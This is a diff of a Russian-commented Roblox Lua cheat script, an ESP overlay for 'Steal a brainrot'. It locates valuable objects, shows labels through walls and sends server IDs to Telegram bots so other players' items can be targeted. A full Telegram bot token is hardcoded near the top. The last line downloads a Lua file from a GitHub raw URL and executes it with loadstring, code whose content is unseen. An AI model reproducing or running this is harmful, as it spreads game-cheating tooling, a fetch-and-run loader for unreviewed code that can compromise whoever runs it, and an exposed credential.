@@ -29,6 +29,13 @@ local SCANNER_SETTINGS = {
     IgnoreClasses = {"SurfaceAppearance", "Part"}
 }
 
+-- Настройки проверки прозрачности
+local TRANSPARENCY_SETTINGS = {
+    MaxTransparency = 0.40,  -- Максимальная допустимая прозрачность
+    CheckCubeParts = true,   -- Проверять части с именем "Cube."
+    LogChecks = true         -- Логировать процесс проверки
+}
+
 -- Настройки Telegram ботов
 local TG_MAIN = {
     Token = "7624455250:AAHXqHESVLzkJi7w9Q5YXyGf394dIfrXy1M",
@@ -48,7 +55,6 @@ local TG_MAIN = {
         ["La Supreme Combinasion"] = true,
         ["Nooo My Hotspot"] = true,
         ["Ketupat Kepat"] = true,
-        ["Nooo My Hotspot"] = true,
         ["Spaghetti Tualetti"] = true,
         ["Strawberry Elephant"] = true,
         ["Ketchuru and Musturu"] = true,
@@ -266,6 +272,26 @@ local function getMutationEmoji(mutation)
     return MUTATION_EMOJIS[mutation] or "⬜️"
 end
 
+-- Функция проверки прозрачности
+local function checkTransparency(obj)
+    if not obj:IsA("Model") then return true end
+    
+    for _, part in ipairs(obj:GetDescendants()) do
+        if part:IsA("BasePart") and TRANSPARENCY_SETTINGS.CheckCubeParts and part.Name:match("^Cube%.") then
+            if TRANSPARENCY_SETTINGS.LogChecks then
+                print("Проверка прозрачности: " .. part.Name .. " - " .. part.Transparency)
+            end
+            if part.Transparency > TRANSPARENCY_SETTINGS.MaxTransparency then
+                if TRANSPARENCY_SETTINGS.LogChecks then
+                    print("❌ " .. obj.Name .. ": найдена часть " .. part.Name .. " с высокой прозрачностью (" .. part.Transparency .. " > " .. TRANSPARENCY_SETTINGS.MaxTransparency .. ")")
+                end
+                return false
+            end
+        end
+    end
+    return true
+end
+
 -- Функции для сбора информации об объектах
 local function findMutation(obj)
     local mutation = obj:GetAttribute("Mutation")
@@ -323,6 +349,14 @@ end
 local function scanObject(obj)
     if not obj or not obj.Parent then return nil end
     
+    -- Проверка прозрачности - если объект слишком прозрачный, не обрабатываем его
+    if not checkTransparency(obj) then
+        if TRANSPARENCY_SETTINGS.LogChecks then
+            print("🚫 " .. obj.Name .. ": пропущен из-за высокой прозрачности")
+        end
+        return nil
+    end
+    
     local mutation = findMutation(obj)
     local traits = findTraits(obj)
     local baseIncomeStr = OBJECT_INCOME[obj.Name] or "0/s"
@@ -333,13 +367,13 @@ local function scanObject(obj)
     local traitsMultiplier = 1
     local appliedMutation = {}
     local appliedTraits = {}
-
+    
     -- Применяем множитель мутации
     if mutation and MUTATION_MULTIPLIERS[mutation] then
         mutationMultiplier = MUTATION_MULTIPLIERS[mutation]
         table.insert(appliedMutation, mutation.." (x"..MUTATION_MULTIPLIERS[mutation]..")")
     end
-
+    
     -- Применяем множители трейтов
     for _, trait in ipairs(traits) do
         if TRAIT_MULTIPLIERS[trait] then
@@ -347,13 +381,13 @@ local function scanObject(obj)
             table.insert(appliedTraits, trait.." (x"..TRAIT_MULTIPLIERS[trait]..")")
         end
     end
-
-    -- Рассчитываем итоговый доход (формула: base * mutation + base * (traits - 1))
+    
+    -- Рассчитываем итоговый доход
     local finalIncome = baseIncome
     if baseIncomeStr ~= "???/s" then
         finalIncome = baseIncome * mutationMultiplier + baseIncome * (traitsMultiplier - 1)
     end
-
+    
     return {
         name = obj.Name,
         mutation = mutation,
@@ -413,7 +447,7 @@ end
 local function createESPElement(obj)
     local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
     if not rootPart then return end
-
+    
     local billboard = Instance.new("BillboardGui")
     billboard.Size = UDim2.new(0, 350, 0, 80)
     billboard.AlwaysOnTop = true
@@ -421,6 +455,8 @@ local function createESPElement(obj)
     billboard.StudsOffset = Vector3.new(0, 3, 0)
     
     local objData = scanObject(obj)
+    if not objData then return nil end  -- Если объект не прошел проверку прозрачности
+    
     local textLabel = createColoredText(objData)
     textLabel.Parent = billboard
     
@@ -515,7 +551,7 @@ local function sendMainTelegramAlert()
     
     if serverId ~= "Одиночная игра" then
         message = message .. string.format(
-            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
+            "\n🚀 Телепорт:\n``````",
             serverId
         )
     end
@@ -565,7 +601,7 @@ local function sendSpecialTelegramAlert()
     
     if serverId ~= "Одиночная игра" then
         message = message .. string.format(
-            "\n🚀 Телепорт:\n```lua\nlocal ts = game:GetService('TeleportService')\nts:TeleportToPlaceInstance(109983668079237, '%s')\n```",
+            "\n🚀 Телепорт:\n``````",
             serverId
         )
     end
@@ -597,7 +633,7 @@ local function updateESP(deltaTime)
     lastUpdate = lastUpdate + deltaTime
     if lastUpdate < ESP_SETTINGS.UpdateInterval then return end
     lastUpdate = 0
-
+    
     -- Очистка кэша
     for obj, data in pairs(espCache) do
         if not obj.Parent or not data.rootPart.Parent then
@@ -606,17 +642,17 @@ local function updateESP(deltaTime)
             foundObjects[obj] = nil
         end
     end
-
+    
     -- Сброс списков для уведомлений перед новым сканированием
     objectsToNotifyMain = {}
     objectsToNotifySpecial = {}
-
+    
     -- Поиск объектов
     for _, obj in ipairs(workspace:GetDescendants()) do
         if table.find(OBJECT_NAMES, obj.Name) and (obj:IsA("BasePart") or obj:IsA("Model")) then
             local rootPart = obj:IsA("Model") and (obj.PrimaryPart or obj:FindFirstChild("HumanoidRootPart") or obj:FindFirstChildWhichIsA("BasePart")) or obj
             if not rootPart then continue end
-
+            
             local distance = (rootPart.Position - camera.CFrame.Position).Magnitude
             if distance > ESP_SETTINGS.MaxDistance then
                 if espCache[obj] then
@@ -624,27 +660,32 @@ local function updateESP(deltaTime)
                 end
                 continue
             end
-
+            
             local isNewObject = not foundObjects[obj]
             foundObjects[obj] = true
-
+            
             if not espCache[obj] then
-                espCache[obj] = createESPElement(obj)
-                local objData = espCache[obj].data
-                playDetectionSound()
-                
-                -- Добавляем в соответствующий список для уведомлений
-                if TG_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 10000000 then
-                    table.insert(objectsToNotifyMain, objData)
-                else
-                    table.insert(objectsToNotifySpecial, objData)
+                local espElement = createESPElement(obj)
+                if espElement then  -- Только если объект прошел все проверки
+                    espCache[obj] = espElement
+                    local objData = espElement.data
+                    playDetectionSound()
+                    
+                    -- Добавляем в соответствующий список для уведомлений
+                    if TG_MAIN.ImportantObjects[obj.Name] or objData.numericIncome >= 10000000 then
+                        table.insert(objectsToNotifyMain, objData)
+                    else
+                        table.insert(objectsToNotifySpecial, objData)
+                    end
                 end
             end
-
+            
             -- Обновление видимости ESP
-            local data = espCache[obj]
-            local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
-            data.labelGui.Enabled = onScreen
+            if espCache[obj] then
+                local data = espCache[obj]
+                local _, onScreen = camera:WorldToViewportPoint(rootPart.Position)
+                data.labelGui.Enabled = onScreen
+            end
         end
     end
     
@@ -713,9 +754,9 @@ end)
 
 -- Первоначальное сканирование
 updateESP(0)
-
 print("Steal a brainrot ESP System активирован!")
 print("Отслеживается объектов: "..#OBJECT_NAMES)
 print("ID сервера:", getServerId())
 print("\nНажмите F для сканирования всех объектов")
+print("Настройки прозрачности: макс. "..TRANSPARENCY_SETTINGS.MaxTransparency)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua"))()
